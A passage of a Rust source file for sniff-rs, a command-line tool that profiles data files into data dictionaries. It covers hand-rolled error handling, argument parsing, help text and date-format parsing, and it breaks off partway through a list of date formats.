use std::collections::{BTreeMap, HashMap, HashSet};
use std::fs;
use std::net::{Ipv4Addr, Ipv6Addr};
use std::path::{Path, PathBuf};

use serde_json::Value as JsonValue;
use serde_json::json;

// --- Hand-rolled stand-in for `anyhow` (see CLAUDE.md's Dependency
// footprint section) ---
// `anyhow::Error` itself is zero-transitive-dependency and this project's
// error handling is nothing fancier than "a message, plus optionally the
// lower-level error that caused it, chained arbitrarily deep" - exactly
// what `Error`/`Context` below provide, in about 40 lines total. `pub`
// only because `main.rs` needs to name `run()`'s return type, the same
// reason `anyhow::Result` used to appear there.

/// An error with a human-readable message and, optionally, the
/// lower-level error that caused it - chained arbitrarily deep, the same
/// shape `anyhow::Error`'s own context chain has.
pub struct Error {
    message: String,
    source: Option<Box<Error>>,
}

impl Error {
    fn msg(message: impl Into<String>) -> Self {
        Error {
            message: message.into(),
            source: None,
        }
    }

    fn wrap(message: impl Into<String>, source: Error) -> Self {
        Error {
            message: message.into(),
            source: Some(Box::new(source)),
        }
    }
}

// Bridges any lower-level error (io::Error, serde_json::Error,
// chrono::ParseError, rusqlite::Error, ...) into this
// project's own Error type, which is what lets `?` convert automatically
// inside any function returning this crate's `Result<T>` - the same role
// anyhow's own blanket `From<E: StdError + Send + Sync + 'static>` impl
// plays. Deliberately *not* implementing `std::error::Error` for `Error`
// itself, the same choice anyhow's own `Error` type makes, and for the
// same reason: it would conflict with core's reflexive `impl<T> From<T>
// for T` once `Error: Into<Error>` is also relied on below.
impl<E: std::error::Error> From<E> for Error {
    fn from(e: E) -> Self {
        Error::msg(e.to_string())
    }
}

impl std::fmt::Display for Error {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.message)
    }
}

// Prints the full context chain, the same information anyhow::Error's own
// Debug impl carries (just not byte-identical formatting - nothing in
// this project's tests depend on that exact layout, only on specific
// substrings appearing somewhere in stderr).
impl std::fmt::Debug for Error {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.message)?;
        let mut cur = self.source.as_deref();
        let mut idx = 0;
        if cur.is_some() {
            write!(f, "\n\nCaused by:")?;
        }
        while let Some(e) = cur {
            write!(f, "\n    {idx}: {}", e.message)?;
            idx += 1;
            cur = e.source.as_deref();
        }
        Ok(())
    }
}

pub type Result<T> = std::result::Result<T, Error>;

/// Stand-in for `anyhow::Context`: attaches a message to any error
/// (including this project's own `Error`, via the reflexive `Into`) or to
/// an `Option`'s `None` case, producing this project's `Error` type
/// either way.
trait Context<T> {
    fn context(self, msg: impl Into<String>) -> Result<T>;
    fn with_context<F: FnOnce() -> String>(self, f: F) -> Result<T>;
}

impl<T, E: Into<Error>> Context<T> for std::result::Result<T, E> {
    fn context(self, msg: impl Into<String>) -> Result<T> {
        self.map_err(|e| Error::wrap(msg.into(), e.into()))
    }

    fn with_context<F: FnOnce() -> String>(self, f: F) -> Result<T> {
        self.map_err(|e| Error::wrap(f(), e.into()))
    }
}

impl<T> Context<T> for Option<T> {
    fn context(self, msg: impl Into<String>) -> Result<T> {
        self.ok_or_else(|| Error::msg(msg.into()))
    }

    fn with_context<F: FnOnce() -> String>(self, f: F) -> Result<T> {
        self.ok_or_else(|| Error::msg(f()))
    }
}

/// Stand-in for `anyhow::bail!` - constructs an `Error` from a format
/// string and returns it immediately.
macro_rules! bail {
    ($($arg:tt)*) => {
        return std::result::Result::Err($crate::Error::msg(format!($($arg)*)))
    };
}

/// Stand-in for `anyhow::anyhow!` - constructs an `Error` from a format
/// string as a value, for the `.ok_or_else(|| anyhow!(...))` style call
/// sites that need an `Error` rather than an immediate `return`.
macro_rules! anyhow {
    ($($arg:tt)*) => {
        $crate::Error::msg(format!($($arg)*))
    };
}

/// Generate a data dictionary from a CSV, TSV, JSON, JSON Lines, Parquet,
/// Arrow IPC/Feather, Avro, Excel, SQLite, MessagePack, TOML, YAML, CBOR,
/// INI, XML, fixed-width text, NumPy (.npy/.npz), a Common/Combined Log
/// Format access log, an RFC 3164/5424 syslog file, dBase (.dbf), Stata
/// (.dta), or SAS7BDAT: one
/// row per column, with a current type, a heuristic "ideal" type
/// suggestion, missing %, sample values, and a blank Description field to
/// fill in by hand. Output is Markdown tables (default), this tool's own
/// rich JSON (--output-format json), or
/// json-schema.org-vocabulary JSON (--output-format json-schema); any of
/// the three can be written to stdout by passing "-" as the output path.
/// SQLite files (one table per database table), Excel workbooks (one
/// table per sheet), INI files (one table per section), and .npz archives
/// (one table per named array) can produce multiple tables; every other
/// format always produces exactly one implicit table - all of it renders
/// through the same path. Format is inferred from the file extension; if
/// there isn't one, or it's not one this tool recognizes, the file's own
/// bytes are sniffed instead (a magic number or other structural signature -
/// see sniff_format), so a misnamed or extensionless file for any format
/// with such a signature still doesn't need --format. --format always wins
/// when given. A .gz or .zst extension is transparently decompressed
/// first, so e.g. data.csv.gz reads exactly like data.csv (gzip always
/// available; zstd needs --features zstd). Every optional format needs its
/// own --features flag (see the Supported formats table in CLAUDE.md), or
/// use --features full for everything.
struct Args {
    /// Path to the input file (.csv, .tsv, .json, .jsonl/.ndjson, .parquet,
    /// .arrow/.feather, .avro, .xlsx/.xls/.xlsb/.ods, .db/.sqlite/.sqlite3,
    /// .msgpack/.mp, .toml, .yaml/.yml, .cbor, .ini, .xml, .npy, .npz,
    /// .dbf, .dta, .sas7bdat; fixed-width text and the log formats have no extension
    /// convention and are only reachable via --format)
    input_path: PathBuf,
    /// Output path (default: <input>.dictionary.md or .json). Pass "-" to write to stdout.
    output_path: Option<PathBuf>,
    /// Number of sample values to show per column
    samples: usize,
    /// Only read the first N rows/records (for large files)
    nrows: Option<usize>,
    /// Override format detection: csv, tsv, json (covers json/jsonl/ndjson), parquet, arrow, avro, xlsx, sqlite, msgpack, toml, yaml, cbor, ini, xml, fixed-width, npy, npz, common-log, combined-log, syslog, syslog5424, dbase, stata, or sas7bdat
    format: Option<String>,
    /// Override the field delimiter for csv/tsv (single character)
    delimiter: Option<char>,
    /// Skip N leading rows before the header (csv/tsv only) - for a
    /// title/instructions banner row some spreadsheet exports carry above
    /// the real header. If not given, a small run of leading rows is
    /// auto-skipped when it shows a strong structural signal of being a
    /// preamble rather than the header - see detect_preamble_rows.
    skip_rows: Option<usize>,
    /// Column widths for --format fixed-width, as comma-separated character
    /// counts (e.g. --widths 10,5,20) - there's no delimiter to split on, so
    /// this format only runs when widths are given explicitly
    widths: Option<Vec<usize>>,
    /// Output format: md (markdown tables), json (this tool's own rich shape), or
    /// json-schema (json-schema.org vocabulary, for schema-consuming tools)
    output_format: String,
}

const HELP_TEXT: &str = r#"sniff-rs - profile a data file and produce a data dictionary

Generate a data dictionary from a CSV, TSV, JSON, JSON Lines, Parquet,
Arrow IPC/Feather, Avro, Excel, SQLite, MessagePack, TOML, YAML, CBOR,
INI, XML, fixed-width text, NumPy (.npy/.npz), a Common/Combined Log
Format access log, an RFC 3164/5424 syslog file, dBase (.dbf), Stata
(.dta), or SAS7BDAT: one row per column, with a current type, a
heuristic "ideal" type suggestion, missing %, sample values, and a
blank Description field to fill in by hand.

USAGE:
    sniff-rs <INPUT_PATH> [OUTPUT_PATH] [OPTIONS]

ARGS:
    <INPUT_PATH>
            Path to the input file. Format is inferred from the extension;
            if there isn't one, or it's not recognized, the file's own
            bytes are sniffed instead. A .gz or .zst extension is
            transparently decompressed first.
    [OUTPUT_PATH]
            Output path (default: <input>.dictionary.md or .json).
            Pass "-" to write to stdout.

OPTIONS:
        --samples <N>          Number of sample values to show per column [default: 3]
        --nrows <N>             Only read the first N rows/records
        --format <FORMAT>       Override format detection (csv, tsv, json, parquet, arrow,
                                avro, xlsx, sqlite, msgpack, toml, yaml, cbor, ini, xml,
                                fixed-width, npy, npz, common-log, combined-log, syslog,
                                syslog5424, dbase, stata, sas7bdat)
        --delimiter <CHAR>      Override the field delimiter for csv/tsv (single character)
        --skip-rows <N>         Skip N leading rows before the header (csv/tsv only)
        --widths <N,N,...>      Column widths for --format fixed-width, comma-separated
        --output-format <FMT>   md (default), json, or json-schema
    -h, --help                  Print this help
    -V, --version                Print version
"#;

/// A minimal hand-rolled stand-in for `clap`'s derive-based parser: this
/// CLI only ever has long (`--flag`) options plus two positionals, so a
/// small manual loop over `std::env::args()` covers the whole surface
/// without pulling in a derive-macro crate and its terminal-formatting
/// dependencies. `--flag value` and `--flag=value` are both accepted;
/// errors flow through the same `anyhow`-based `Result` chain every other
/// error in this project already uses, rather than clap's own separate
/// exit-code convention - `--help`/`--version` are the one place this
/// still exits the process directly, matching what a user actually expects
/// from either flag.
impl Args {
    fn parse() -> Result<Self> {
        let raw: Vec<String> = std::env::args().skip(1).collect();
        Self::parse_from(&raw)
    }

    fn parse_from(raw: &[String]) -> Result<Self> {
        let mut samples: usize = 3;
        let mut nrows: Option<usize> = None;
        let mut format: Option<String> = None;
        let mut delimiter: Option<char> = None;
        let mut skip_rows: Option<usize> = None;
        let mut widths: Option<Vec<usize>> = None;
        let mut output_format = "md".to_string();
        let mut positionals: Vec<String> = Vec::new();

        let mut i = 0;
        while i < raw.len() {
            let arg = raw[i].as_str();
            if arg == "-h" || arg == "--help" {
                print!("{HELP_TEXT}");
                std::process::exit(0);
            }
            if arg == "-V" || arg == "--version" {
                println!("sniff-rs {}", env!("CARGO_PKG_VERSION"));
                std::process::exit(0);
            }
            if let Some(rest) = arg.strip_prefix("--") {
                let (name, inline_value) = match rest.split_once('=') {
                    Some((n, v)) => (n.to_string(), Some(v.to_string())),
                    None => (rest.to_string(), None),
                };
                let value = |i: &mut usize| -> Result<String> {
                    if let Some(v) = inline_value.clone() {
                        return Ok(v);
                    }
                    *i += 1;
                    raw.get(*i)
                        .cloned()
                        .ok_or_else(|| anyhow!("--{name} requires a value"))
                };
                match name.as_str() {
                    "samples" => {
                        let v = value(&mut i)?;
                        samples = v
                            .parse()
                            .with_context(|| format!("--samples: invalid number {v:?}"))?;
                    }
                    "nrows" => {
                        let v = value(&mut i)?;
                        nrows = Some(
                            v.parse()
                                .with_context(|| format!("--nrows: invalid number {v:?}"))?,
                        );
                    }
                    "format" => format = Some(value(&mut i)?),
                    "delimiter" => {
                        let v = value(&mut i)?;
                        let mut chars = v.chars();
                        let c = chars.next().ok_or_else(|| {
                            anyhow!("--delimiter: expected a single character, got \"\"")
                        })?;
                        if chars.next().is_some() {
                            bail!("--delimiter: expected a single character, got {v:?}");
                        }
                        delimiter = Some(c);
                    }
                    "skip-rows" => {
                        let v = value(&mut i)?;
                        skip_rows = Some(
                            v.parse()
                                .with_context(|| format!("--skip-rows: invalid number {v:?}"))?,
                        );
                    }
                    "widths" => {
                        let v = value(&mut i)?;
                        let parsed: Result<Vec<usize>> = v
                            .split(',')
                            .map(|s| {
                                s.trim()
                                    .parse::<usize>()
                                    .with_context(|| format!("--widths: invalid number {s:?}"))
                            })
                            .collect();
                        widths = Some(parsed?);
                    }
                    "output-format" => output_format = value(&mut i)?,
                    other => bail!("unrecognized flag --{other}"),
                }
            } else if let Some(short) = arg.strip_prefix('-')
                && !short.is_empty()
                && short != "-"
            {
                bail!("unrecognized flag {arg}");
            } else {
                positionals.push(arg.to_string());
            }
            i += 1;
        }

        let mut positionals = positionals.into_iter();
        let input_path = positionals
            .next()
            .map(PathBuf::from)
            .ok_or_else(|| anyhow!("missing required argument: input_path"))?;
        let output_path = positionals.next().map(PathBuf::from);
        if let Some(extra) = positionals.next() {
            bail!("unexpected extra argument: {extra}");
        }

        Ok(Args {
            input_path,
            output_path,
            samples,
            nrows,
            format,
            delimiter,
            skip_rows,
            widths,
            output_format,
        })
    }
}

// --- Hand-rolled stand-in for chrono's date/time parsing and civil-
// calendar arithmetic (see CLAUDE.md's Dependency footprint section) ---
// Only covers what this project actually needs: matching a value against
// one of the fixed strftime-style formats in DATE_FORMATS/TIME_FORMATS
// below (used by the default CSV/JSON build), and converting a stored
// epoch offset (days/seconds/millis/... since 1970-01-01) to a formatted
// string (used by the Avro and SAS7BDAT readers). `chrono` itself is now
// an *optional* dependency, needed only by the `xlsx` feature - calamine's
// own `as_datetime()` API returns a real `chrono::NaiveDateTime`
// regardless of what this project's own code does, so that one call site
// can't avoid the real crate no matter what.
//
// The civil-calendar conversion (days_from_civil/civil_from_days) is
// Howard Hinnant's well-known algorithm
// (http://howardhinnant.github.io/date_algorithms.html) rather than
// something derived from scratch - verified against Python's `datetime`
// module across leap-year, century-boundary, and proleptic-range cases
// (year 1, year 9999, 1600/1900/2000/2100/2400) before being trusted, the
// same "verify against a known-correct source" discipline this project
// already applies to `sniff_format`'s magic-byte checks. Every directive
// this project's own DATE_FORMATS/TIME_FORMATS list actually uses was
// checked directly against chrono's own `format/parse.rs`/`scan.rs`
// source (not assumed from the strftime man page) - notably: `%Y` scans
// 1-4 digits (not exactly 4 - this is *why* the %y-before-%Y ordering
// trick above works at all), `%y`'s real pivot boundary is `< 70` (00-69
// -> 2000s, 70-99 -> 1900s - confirmed directly against `parsed.rs`,
// which turns out to be one year off from this file's own paraphrase
// elsewhere of "00-68/69-99"), `%z` accepts any run of `:`/whitespace
// between the hour and minute digits, and `%a` is cross-validated against
// the actual computed weekday of the parsed date, not just shape-matched.

/// Converts a proleptic-Gregorian (year, month, day) to days since
/// 1970-01-01 (which is day 0; negative for earlier dates).
fn days_from_civil(y: i64, m: u32, d: u32) -> i64 {
    let y = if m <= 2 { y - 1 } else { y };
    let era = if y >= 0 { y } else { y - 399 } / 400;
    let yoe = y - era * 400;
    let mp = i64::from(if m > 2 { m - 3 } else { m + 9 });
    let doy = (153 * mp + 2) / 5 + i64::from(d) - 1;
    let doe = yoe * 365 + yoe / 4 - yoe / 100 + doy;
    era * 146097 + doe - 719468
}

/// The inverse of `days_from_civil`.
fn civil_from_days(z: i64) -> (i64, u32, u32) {
    let z = z + 719468;
    let era = if z >= 0 { z } else { z - 146096 } / 146097;
    let doe = z - era * 146097;
    let yoe = (doe - doe / 1460 + doe / 36524 - doe / 146096) / 365;
    let y = yoe + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = (doy - (153 * mp + 2) / 5 + 1) as u32;
    let m = if mp < 10 { mp + 3 } else { mp - 9 } as u32;
    let y = if m <= 2 { y + 1 } else { y };
    (y, m, d)
}

/// 0 = Sunday .. 6 = Saturday. 1970-01-01 (day 0) is a Thursday (index 4).
fn weekday_index(days: i64) -> u32 {
    (days.rem_euclid(7) + 4).rem_euclid(7) as u32
}

fn is_leap_year(y: i64) -> bool {
    (y % 4 == 0 && y % 100 != 0) || y % 400 == 0
}

fn days_in_month(y: i64, m: u32) -> u32 {
    match m {
        1 | 3 | 5 | 7 | 8 | 10 | 12 => 31,
        4 | 6 | 9 | 11 => 30,
        2 => {
            if is_leap_year(y) {
                29
            } else {
                28
            }
        }
        _ => 0,
    }
}

/// Scans `min..=max` consecutive ASCII digits from the start of `s`
/// (greedy, stopping at the first non-digit or after `max` digits),
/// matching chrono's own `scan::number` exactly - confirmed directly
/// against its source, since this is the detail the whole %y-before-%Y
/// ordering trick depends on.
fn scan_digits(s: &str, min: usize, max: usize) -> Option<(i64, &str)> {
    let bytes = s.as_bytes();
    let mut n: i64 = 0;
    let mut count = 0;
    for &b in bytes.iter().take(max) {
        if !b.is_ascii_digit() {
            break;
        }
        n = n.checked_mul(10)?.checked_add(i64::from(b - b'0'))?;
        count += 1;
    }
    if count < min {
        return None;
    }
    Some((n, &s[count..]))
}

const MONTH_ABBR: [&str; 12] = [
    "jan", "feb", "mar", "apr", "may", "jun", "jul", "aug", "sep", "oct", "nov", "dec",
];
// Suffix that extends the abbreviation into the full name, e.g. "jan" +
// "uary" -> "january" - matching chrono's own `short_or_long_month0`.
const MONTH_LONG_SUFFIX: [&str; 12] = [
    "uary", "ruary", "ch", "il", "", "e", "y", "ust", "tember", "ober", "ember", "ember",
];
const WEEKDAY_ABBR: [&str; 7] = ["sun", "mon", "tue", "wed", "thu", "fri", "sat"];

// `str::is_char_boundary(n)` doubles as the length check here (it
// returns false when `n > v.len()`, per its own documented contract), and
// - critically - also refuses to slice mid-character rather than
// panicking: a byte offset that would otherwise land inside a multi-byte
// UTF-8 character (found via adversarial testing with 💥/é-repeated
// input, the same discipline CLAUDE.md's design-philosophy section
// already applies to every other validator in this file) safely fails
// the match instead, since an all-ASCII 3-letter name could never equal
// a prefix that isn't even 3 whole characters long anyway.
fn scan_month_short(v: &str) -> Option<(u32, &str)> {
    if !v.is_char_boundary(3) {
        return None;
    }
    let prefix = &v[..3];
    MONTH_ABBR
        .iter()
        .position(|name| prefix.eq_ignore_ascii_case(name))
        .map(|i| (i as u32 + 1, &v[3..]))
}

fn scan_month_long(v: &str) -> Option<(u32, &str)> {
    let (month, rest) = scan_month_short(v)?;
    let suffix = MONTH_LONG_SUFFIX[(month - 1) as usize];
    if !suffix.is_empty()
        && rest.is_char_boundary(suffix.len())
        && rest[..suffix.len()].eq_ignore_ascii_case(suffix)
    {
        Some((month, &rest[suffix.len()..]))
    } else {
        Some((month, rest))
    }
}

fn scan_weekday_short(v: &str) -> Option<(u32, &str)> {
    if !v.is_char_boundary(3) {
        return None;
    }
    let prefix = &v[..3];
    WEEKDAY_ABBR
        .iter()
        .position(|name| prefix.eq_ignore_ascii_case(name))
        .map(|i| (i as u32, &v[3..]))
}

/// `%z`: a sign, exactly 2 hour digits, any run of `:`/whitespace
/// (possibly none), then exactly 2 minute digits - matching chrono's own
/// `scan::timezone_offset` with its default `colon_or_space` separator.
/// The offset value itself is never used downstream (matching_date_format
/// only checks whether the value matches at all), so this only validates
/// shape and returns the remaining unconsumed slice.
fn scan_tz_offset(v: &str) -> Option<&str> {
    let mut chars = v.chars();
    match chars.next() {
        Some('+') | Some('-') => {}
        _ => return None,
    }
    let rest = chars.as_str();
    let (_hours, rest) = scan_digits(rest, 2, 2)?;
    let rest = rest.trim_start_matches(|c: char| c == ':' || c.is_whitespace());
    let (_minutes, rest) = scan_digits(rest, 2, 2)?;
    Some(rest)
}

#[derive(Default)]
struct DateFields {
    year: Option<i32>,
    month: Option<u32>,
    day: Option<u32>,
    hour: Option<u32>,
    hour12: Option<u32>,
    is_pm: Option<bool>,
    minute: Option<u32>,
    second: Option<u32>,
    weekday: Option<u32>,
}

/// Walks `fmt` (a small strftime-style subset - only the directives
/// DATE_FORMATS/TIME_FORMATS actually use) and `value` in lockstep,
/// extracting whichever fields the format names. Returns `None` on any
/// mismatch, including leftover unconsumed input at the end (the same
/// "the whole value must match the whole format" contract
/// `NaiveDate::parse_from_str`/`NaiveDateTime::parse_from_str` both
/// enforce) - callers that only care about a strict date, a strict time,
/// or a datetime all just call this once and look at whichever fields
/// they need, rather than needing chrono's own separate
/// NaiveDate-vs-NaiveDateTime entry points.
fn parse_date_fields(value: &str, fmt: &str) -> Option<DateFields> {
    let mut f = DateFields::default();
    let mut v = value;
    let mut chars = fmt.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '%' {
            match chars.next()? {
                'Y' => {
                    let (n, rest) = scan_digits(v, 1, 4)?;
                    f.year = Some(n as i32);
                    v = rest;
                }
                'y' => {
                    let (n, rest) = scan_digits(v, 2, 2)?;
                    f.year = Some(if n < 70 {
                        2000 + n as i32
                    } else {
                        1900 + n as i32
                    });
                    v = rest;
                }
                'm' => {
                    let (n, rest) = scan_digits(v, 1, 2)?;
                    f.month = Some(n as u32);
                    v = rest;
                }
                'd' => {
                    let (n, rest) = scan_digits(v, 1, 2)?;
                    f.day = Some(n as u32);
                    v = rest;
                }
                'H' => {
                    let (n, rest) = scan_digits(v, 1, 2)?;
                    f.hour = Some(n as u32);
                    v = rest;
                }
                'I' => {
                    let (n, rest) = scan_digits(v, 1, 2)?;
                    f.hour12 = Some(n as u32);
                    v = rest;
                }
                'M' => {
                    let (n, rest) = scan_digits(v, 1, 2)?;
                    f.minute = Some(n as u32);
                    v = rest;
                }
                'S' => {
                    let (n, rest) = scan_digits(v, 1, 2)?;
                    f.second = Some(n as u32);
                    v = rest;
                }
                'p' => {
                    if !v.is_char_boundary(2) {
                        return None;
                    }
                    let two = &v[..2];
                    if two.eq_ignore_ascii_case("am") {
                        f.is_pm = Some(false);
                    } else if two.eq_ignore_ascii_case("pm") {
                        f.is_pm = Some(true);
                    } else {
                        return None;
                    }
                    v = &v[2..];
                }
                'b' => {
                    let (m, rest) = scan_month_short(v)?;
                    f.month = Some(m);
                    v = rest;
                }
                'B' => {
                    let (m, rest) = scan_month_long(v)?;
                    f.month = Some(m);
                    v = rest;
                }
                'a' => {
                    let (wd, rest) = scan_weekday_short(v)?;
                    f.weekday = Some(wd);
                    v = rest;
                }
                '.' => {
                    if chars.next() != Some('f') {
                        return None; // only the "%.f" directive is supported
                    }
                    // Tolerates a value with no fractional seconds at all -
                    // only consumes it if a '.' is actually present.
                    if let Some(rest) = v.strip_prefix('.') {
                        let (_frac, rest) = scan_digits(rest, 1, 9)?;
                        v = rest;
                    }
                }
                'z' => {
                    v = scan_tz_offset(v)?;
                }
                '%' => {
                    v = v.strip_prefix('%')?;
                }
                _ => return None,
            }
        } else {
            let mut vc = v.chars();
            if vc.next() != Some(c) {
                return None;
            }
            v = vc.as_str();
        }
    }
    if !v.is_empty() {
        return None; // trailing input the format didn't account for
    }

    if let (Some(month), Some(day)) = (f.month, f.day) {
        if !(1..=12).contains(&month) {
            return None;
        }
        let max_day = match f.year {
            Some(year) => days_in_month(i64::from(year), month),
            None => 31,
        };
        if day < 1 || day > max_day {
            return None;
        }
    }
    if let Some(h) = f.hour
        && h > 23
    {
        return None;
    }
    if let Some(h12) = f.hour12
        && !(1..=12).contains(&h12)
    {
        return None;
    }
    if let Some(m) = f.minute
        && m > 59
    {
        return None;
    }
    if let Some(s) = f.second
        && s > 59
    {
        return None;
    }
    if let (Some(year), Some(month), Some(day), Some(wd)) = (f.year, f.month, f.day, f.weekday) {
        let actual = weekday_index(days_from_civil(i64::from(year), month, day));
        if actual != wd {
            return None; // %a must match the date it's attached to
        }
    }

    Some(f)
}

fn matches_date_format(value: &str, fmt: &str) -> bool {
    parse_date_fields(value, fmt).is_some()
}

// A minimal date/time/datetime value type covering exactly what the Avro
// and SAS7BDAT readers need: turning a stored epoch offset (days/seconds/
// millis/micros/nanos since 1970-01-01) into one of a handful of fixed
// output strings, via the same civil-calendar conversion above. Not a
// general calendar library - no arithmetic, comparison, or parsing, just
// epoch-in / formatted-string-out.
#[allow(dead_code)]
struct EpochDate {
    year: i32,
    month: u32,
    day: u32,
}

#[allow(dead_code)]
impl EpochDate {
    fn from_days(days: i64) -> Option<Self> {
        let (y, m, d) = civil_from_days(days);
        Some(EpochDate {
            year: i32::try_from(y).ok()?,
            month: m,
            day: d,
        })
    }

    fn format_ymd(&self) -> String {
        format!("{:04}-{:02}-{:02}", self.year, self.month, self.day)
    }
}

#[allow(dead_code)]
struct EpochTime {
    hour: u32,
    minute: u32,
    second: u32,
    nanosecond: u32,
}

#[allow(dead_code)]
impl EpochTime {
    fn from_seconds_since_midnight(total_secs: u32, nanosecond: u32) -> Option<Self> {
        if total_secs >= 86_400 || nanosecond >= 1_000_000_000 {
            return None;
        }
        Some(EpochTime {
            hour: total_secs / 3600,
            minute: (total_secs % 3600) / 60,
            second: total_secs % 60,
            nanosecond,
        })
    }

    fn format_hms(&self) -> String {
        format!("{:02}:{:02}:{:02}", self.hour, self.minute, self.second)
    }

    /// Fixed-width fractional seconds (always exactly `digits` digits,
    /// zero-padded) - a different, simpler contract than `%.f`'s
    /// tolerant/variable-width parsing above, matching what Avro's own
    /// millis/micros/nanos logical types need for output.
    fn format_hms_frac(&self, digits: u32) -> String {
        let scale = 10u32.pow(9 - digits);
        let frac = self.nanosecond / scale;
        format!(
            "{}.{:0width$}",
            self.format_hms(),
            frac,
            width = digits as usize
        )
    }
}

#[allow(dead_code)]
struct EpochDateTime {
    date: EpochDate,
    time: EpochTime,
}

#[allow(dead_code)]
impl EpochDateTime {
    fn from_days_and_seconds(days: i64, secs_in_day: u32, nanosecond: u32) -> Option<Self> {
        Some(EpochDateTime {
            date: EpochDate::from_days(days)?,
            time: EpochTime::from_seconds_since_midnight(secs_in_day, nanosecond)?,
        })
    }

    fn from_unix_seconds(total_secs: i64, nanosecond: u32) -> Option<Self> {
        Self::from_days_and_seconds(
            total_secs.div_euclid(86_400),
            total_secs.rem_euclid(86_400) as u32,
            nanosecond,
        )
    }

    fn from_unix_millis(total_millis: i64) -> Option<Self> {
        let ms_in_day = total_millis.rem_euclid(86_400_000) as u32;
        Self::from_days_and_seconds(
            total_millis.div_euclid(86_400_000),
            ms_in_day / 1000,
            (ms_in_day % 1000) * 1_000_000,
        )
    }

    fn from_unix_micros(total_micros: i64) -> Option<Self> {
        let us_in_day = total_micros.rem_euclid(86_400_000_000) as u64;
        Self::from_days_and_seconds(
            total_micros.div_euclid(86_400_000_000),
            (us_in_day / 1_000_000) as u32,
            ((us_in_day % 1_000_000) * 1000) as u32,
        )
    }

    fn format_space(&self) -> String {
        format!("{} {}", self.date.format_ymd(), self.time.format_hms())
    }

    fn format_t_frac(&self, digits: u32) -> String {
        format!(
            "{}T{}",
            self.date.format_ymd(),
            self.time.format_hms_frac(digits)
        )
    }
}

// chrono's `%Y` accepts variable-width numeric input while parsing (it only
// zero-pads to 4 digits on *output*), so it will happily parse a genuinely
// 2-digit year like "24" as the literal year 24 AD rather than rejecting
// it - confirmed directly (`NaiveDate::parse_from_str("01/15/24",
// "%m/%d/%Y")` succeeds as `0024-01-15`, not an error). Wherever this list
// has both a %y and a %Y form of the same layout below, the %y form is
// placed *first*, specifically so it wins for genuinely 2-digit years -
// %y in turn correctly *rejects* an actually-4-digit year ("trailing
// input", also confirmed directly), so this ordering changes nothing for
// already-4-digit data and only fixes the 2-digit case, from silently
// wrong to correct. This is a real, general characteristic of chrono
// itself, not something fully closed off for every %Y-anchored entry
// below - only the layouts that have an established 2-digit-year
// convention in practice got a %y sibling added.
const DATE_FORMATS: &[&str] = &[
    // Two-digit-year variants, deliberately ordered before their %Y
    // counterparts just below (see the module-level comment above) -
    // common in older exports and some spreadsheet defaults. The pivot
    // (00-69 -> 2000-2069, 70-99 -> 1970-1999) is the same convention
    // every other tool assumes; this is a real, disclosed ambiguity for
    // genuinely 100+-year-old dates, not something this project can
    // resolve any more precisely than the format itself allows. This
    // exact boundary was worth re-confirming directly against chrono's
    // own source (`format/parsed.rs`'s `resolve_year`, `r < 70`) while
    // hand-rolling a replacement parser (see the Dependency footprint
    // section) - it turned out to be one year off from an earlier
    // paraphrase here ("00-68/69-99"), a genuine, if narrow, discrepancy
    // between what this comment used to claim and chrono's real behavior.
    "%m/%d/%y", // e.g. "01/15/24"
    "%d/%m/%y", // e.g. "15/01/24"
    "%Y-%m-%d",
    "%Y/%m/%d",
    "%m/%d/%Y",
    "%d/%m/%Y",
    "%d-%m-%Y",
    "%Y-%m-%dT%H:%M:%S",
    "%Y-%m-%d %H:%M:%S",
    "%m-%d-%Y",
    "%d %b %Y",
    "%b %d, %Y",
    "%d/%b/%Y:%H:%M:%S %z", // Common/Combined Log Format's timestamp
    "%Y%m%d",               // dBase's own Date field rendering
    // RFC 3339 / ISO 8601, as commonly produced by JSON APIs. %.f tolerates
    // a value with no fractional seconds at all, and %z accepts both a
    // colon and non-colon offset ("+00:00" and "+0000" alike) - both
    // verified empirically, not assumed - so each of these also covers its
    // own no-fraction/no-colon variant without a separate duplicate entry.
    "%Y-%m-%dT%H:%M:%S%.fZ",  // UTC, e.g. "2023-01-01T12:00:00.123Z"
    "%Y-%m-%dT%H:%M:%S%.f%z", // offset, e.g. "...+0000" or "...+00:00"
    "%Y-%m-%dT%H:%M:%S%.f",   // no offset at all, fractional seconds only
    // European/international dot- and dot-order variants - each verified
    // against real chrono behavior before being added, the same as every
    // entry above.
    "%d.%m.%Y", // e.g. "15.01.2024" - the common German/European convention
    "%Y.%m.%d", // e.g. "2024.01.15" - ISO field order, dot-separated
    // Full month name, as an addition alongside the existing abbreviated
    // (%b) forms above.
    "%B %d, %Y", // e.g. "January 15, 2024"
    "%d %B %Y",  // e.g. "15 January 2024"
    // RFC 2822 / RFC 1123 - the HTTP `Date` header and email `Date` field's
    // own standard format. Verified that chrono actually cross-validates
    // %a against the parsed date (a value claiming the wrong weekday for
    // its actual date is correctly rejected, not just shape-matched).
    "%a, %d %b %Y %H:%M:%S %z", // e.g. "Mon, 15 Jan 2024 10:00:00 +0000"
    // The same RFC 2822 shape, but with the literal named zone "GMT"
    // instead of a numeric offset - found via a real-world sweep of RSS
    // feeds (BBC News uses this; RFC 7231's own HTTP `Date`-header
    // "IMF-fixdate" grammar mandates literal "GMT" specifically, not a
    // numeric offset, so this is a spec-standard shape, not an outlier).
    // `%z` doesn't accept "GMT" (confirmed directly: "input contains
    // invalid characters"), but a literal "GMT" in the format string
    // matches it as plain text, which is exactly correct here since
    // GMT's offset is always zero - nothing is lost treating it as naive.
    "%a, %d %b %Y %H:%M:%S GMT", // e.g. "Mon, 15 Jan 2024 10:00:00 GMT"
    // Unix `date`/`ctime()`'s own default textual format (also git log's
    // default), e.g. "Mon Jan 15 10:00:00 2024" - a real, distinct field
    // order from RFC 2822 above (weekday/month/day before year, no comma,
    // no offset).
    "%a %b %d %H:%M:%S %Y",
    // Oracle's own default NLS_DATE_FORMAT ('DD-MON-YY'/'DD-MON-RR'), a
    // very common shape in database exports. %y form first - same reason
    // as the module-level comment above.
    "%d-%b-%y", // e.g. "15-Jan-24"
    "%d-%b-%Y", // e.g. "15-Jan-2024"
    // Datetime combinations not already covered above: US-ordered with a
    // time component, and ISO with no seconds (the latter is what an
    // HTML5 `<input type="datetime-local">` field submits).
    "%m/%d/%Y %H:%M:%S",
